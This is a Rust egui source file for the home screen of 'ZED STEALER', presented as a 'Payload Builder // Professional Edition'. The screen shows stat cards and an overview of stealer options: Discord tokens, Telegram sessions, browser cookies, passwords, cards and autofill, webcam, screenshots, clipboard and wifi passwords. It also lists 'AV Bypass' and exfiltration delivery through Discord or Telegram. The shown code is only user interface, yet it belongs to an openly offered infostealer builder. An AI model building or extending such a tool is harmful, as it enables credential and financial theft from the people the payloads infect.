use egui::{Color32, CornerRadius, Frame, Margin, Sense, Stroke, pos2, vec2};
use crate::state::AppState;
use crate::theme::ZedTheme;

struct StatCard {
    label: &'static str,
    value: String,
    color: Color32,
}

pub fn draw_home(ui: &mut egui::Ui, ctx: &egui::Context, state: &AppState) {
    let t = ui.input(|i| i.time) as f32;

    egui::ScrollArea::vertical()
        .auto_shrink([false; 2])
        .show(ui, |ui| {
            ui.add_space(24.0);

            // ── Header ────────────────────────────────────────────────────────
            ui.horizontal(|ui| {
                ui.add_space(12.0);
                ui.vertical(|ui| {
                    ui.label(
                        egui::RichText::new("ZED STEALER")
                            .color(ZedTheme::PINK)
                            .size(28.0)
                            .strong(),
                    );
                    ui.add_space(2.0);
                    ui.label(
                        egui::RichText::new("Payload Builder  //  Professional Edition")
                            .color(ZedTheme::TEXT_DIM)
                            .size(12.0),
                    );
                });
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Min), |ui| {
                    ui.add_space(12.0);
                    let pulse = ((t * 2.0).sin() * 0.5 + 0.5) * 0.6 + 0.4;
                    let (r, _) = ui.allocate_exact_size(vec2(10.0, 10.0), Sense::hover());
                    ui.painter().circle_filled(r.center(), 4.0 + pulse * 1.5, ZedTheme::SUCCESS);
                    ui.painter().circle_filled(
                        r.center(),
                        7.0 + pulse * 3.0,
                        Color32::from_rgba_premultiplied(40, 200, 120, (pulse * 35.0) as u8),
                    );
                    ui.add_space(6.0);
                    ui.label(egui::RichText::new("READY").color(ZedTheme::SUCCESS).size(11.0).strong());
                });
            });

            ui.add_space(24.0);

            // ── Stat cards ────────────────────────────────────────────────────
            let stats = vec![
                StatCard { label: "Features",   value: count_features(state),                color: ZedTheme::PINK },
                StatCard { label: "Delivery",   value: delivery_method(state).to_string(),    color: ZedTheme::SUCCESS },
                StatCard { label: "Protection", value: "HIGH".into(),                          color: ZedTheme::WARNING },
                StatCard { label: "Output",     value: state.compiler.output_name.clone(),    color: ZedTheme::TEXT_NORMAL },
            ];

            ui.horizontal(|ui| {
                ui.spacing_mut().item_spacing.x = 0.0;
                ui.add_space(12.0);
                let avail  = ui.available_width() - 12.0; // right padding
                let gap    = 10.0_f32;
                let card_w = ((avail - gap * 3.0) / 4.0).max(1.0);
                for (i, stat) in stats.iter().enumerate() {
                    if i > 0 { ui.add_space(gap); }
                    draw_stat_card(ui, ctx, stat, card_w, t);
                }
            });

            ui.add_space(24.0);

            // ── Quick Overview ─────────────────────────────────────────────────
            ui.horizontal(|ui| {
                ui.spacing_mut().item_spacing.x = 0.0;
                ui.add_space(12.0);
                let card_w = (ui.available_width() - 12.0).max(1.0);
                Frame::new()
                    .fill(Color32::from_rgb(18, 15, 28))
                    .corner_radius(CornerRadius::same(10))
                    .stroke(Stroke::new(1.0, Color32::from_rgb(45, 35, 60)))
                    .inner_margin(Margin::same(16))
                    .show(ui, |ui| {
                        ui.set_min_width(card_w - 2.0);
                        ui.label(
                            egui::RichText::new("Quick Overview")
                                .color(ZedTheme::TEXT_BRIGHT)
                                .size(13.0)
                                .strong(),
                        );
                        ui.add_space(12.0);

                        let items: &[(&str, &str, Color32)] = &[
                            ("Discord",    get_discord_status(state),  ZedTheme::PINK),
                            ("Telegram",   get_telegram_status(state), ZedTheme::PINK),
                            ("Browsers",   get_browser_status(state),  ZedTheme::PINK),
                            ("System",     "Enabled",                   ZedTheme::SUCCESS),
                            ("AV Bypass",  "Active",                    ZedTheme::SUCCESS),
                            ("Encryption", "AES-256-GCM",               ZedTheme::WARNING),
                        ];

                        let ncols = 2usize;
                        let nrows = (items.len() + ncols - 1) / ncols;

                        for row in 0..nrows {
                            ui.horizontal(|ui| {
                                ui.spacing_mut().item_spacing.x = 0.0;
                                let col_w = (ui.available_width() / ncols as f32).max(1.0);
                                for col in 0..ncols {
                                    let idx = row * ncols + col;
                                    if idx < items.len() {
                                        let (k, v, c) = items[idx];
                                        ui.vertical(|ui| {
                                            ui.set_width(col_w);
                                            ui.horizontal(|ui| {
                                                ui.label(egui::RichText::new(format!("{k}:")).color(ZedTheme::TEXT_DIM).size(12.0));
                                                ui.add_space(6.0);
                                                ui.label(egui::RichText::new(v).color(c).size(12.0).strong());
                                            });
                                        });
                                    }
                                }
                            });
                            ui.add_space(6.0);
                        }
                    });
            });

            ui.add_space(20.0);

            // ── Warning banner ─────────────────────────────────────────────────
            ui.horizontal(|ui| {
                ui.spacing_mut().item_spacing.x = 0.0;
                ui.add_space(12.0);
                let w = (ui.available_width() - 12.0).max(1.0);
                Frame::new()
                    .fill(Color32::from_rgba_premultiplied(255, 165, 40, 12))
                    .corner_radius(CornerRadius::same(8))
                    .stroke(Stroke::new(1.0, Color32::from_rgba_premultiplied(255, 165, 40, 70)))
                    .inner_margin(Margin::symmetric(14, 10))
                    .show(ui, |ui| {
                        ui.set_min_width(w - 2.0);
                        ui.label(
                            egui::RichText::new("[ ! ]  Configure delivery settings in Builder before compiling.")
                                .color(ZedTheme::WARNING)
                                .size(12.0),
                        );
                    });
            });

            ui.add_space(16.0);
        });
}

// ── Stat card ──────────────────────────────────────────────────────────────────

fn draw_stat_card(ui: &mut egui::Ui, ctx: &egui::Context, stat: &StatCard, width: f32, _t: f32) {
    let (rect, resp) = ui.allocate_exact_size(vec2(width, 78.0), Sense::hover());

    let anim_id   = ui.id().with(stat.label).with("h");
    let hover_anim = ctx.animate_bool_with_time(anim_id, resp.hovered(), 0.15);

    let painter = ui.painter_at(rect);

    // Background — clearly visible against BG_VOID
    painter.rect_filled(rect, CornerRadius::same(10), Color32::from_rgb(22, 18, 32));

    // Colored top accent line
    let line_w = rect.width() * (0.35 + hover_anim * 0.45);
    painter.line_segment(
        [pos2(rect.left() + 10.0, rect.top() + 1.0), pos2(rect.left() + 10.0 + line_w, rect.top() + 1.0)],
        Stroke::new(2.5, Color32::from_rgba_premultiplied(
            stat.color.r(), stat.color.g(), stat.color.b(),
            (140.0 + hover_anim * 115.0) as u8,
        )),
    );

    // Border
    painter.rect_stroke(
        rect,
        CornerRadius::same(10),
        Stroke::new(1.0, Color32::from_rgba_premultiplied(
            stat.color.r(), stat.color.g(), stat.color.b(),
            (55.0 + hover_anim * 100.0) as u8,
        )),
        egui::epaint::StrokeKind::Outside,
    );

    // Value text (large, bright)
    painter.text(
        pos2(rect.left() + 14.0, rect.top() + 26.0),
        egui::Align2::LEFT_CENTER,
        &stat.value,
        egui::FontId::new(16.0, egui::FontFamily::Monospace),
        Color32::from_rgba_premultiplied(
            stat.color.r(), stat.color.g(), stat.color.b(),
            (200.0 + hover_anim * 55.0) as u8,
        ),
    );

    // Label text
    painter.text(
        pos2(rect.left() + 14.0, rect.bottom() - 16.0),
        egui::Align2::LEFT_CENTER,
        stat.label,
        egui::FontId::new(10.5, egui::FontFamily::Proportional),
        ZedTheme::TEXT_NORMAL,
    );
}

// ── Helpers ────────────────────────────────────────────────────────────────────

fn count_features(state: &AppState) -> String {
    let f = &state.features;
    [
        f.discord_tokens, f.discord_nitro_check, f.discord_friends,
        f.telegram_sessions,
        f.browser_cookies, f.browser_passwords, f.browser_history,
        f.browser_cards, f.browser_autofill,
        f.system_info, f.hardware_info, f.network_info,
        f.screenshot, f.webcam, f.clipboard,
        f.wifi_passwords, f.installed_apps, f.startup_files,
    ].iter().filter(|&&v| v).count().to_string()
}

fn delivery_method(state: &AppState) -> &'static str {
    match (state.delivery.use_discord, state.delivery.use_telegram) {
        (true, true)   => "Both",
        (true, false)  => "Discord",
        (false, true)  => "Telegram",
        (false, false) => "None",
    }
}

fn get_discord_status(state: &AppState) -> &'static str {
    if state.features.discord_tokens { "Tokens + Nitro" } else { "Disabled" }
}

fn get_telegram_status(state: &AppState) -> &'static str {
    if state.features.telegram_sessions { "Sessions Active" } else { "Disabled" }
}

fn get_browser_status(state: &AppState) -> &'static str {
    if state.features.browser_cookies || state.features.browser_passwords {
        "Cookies + Passwords"
    } else {
        "Disabled"
    }
}
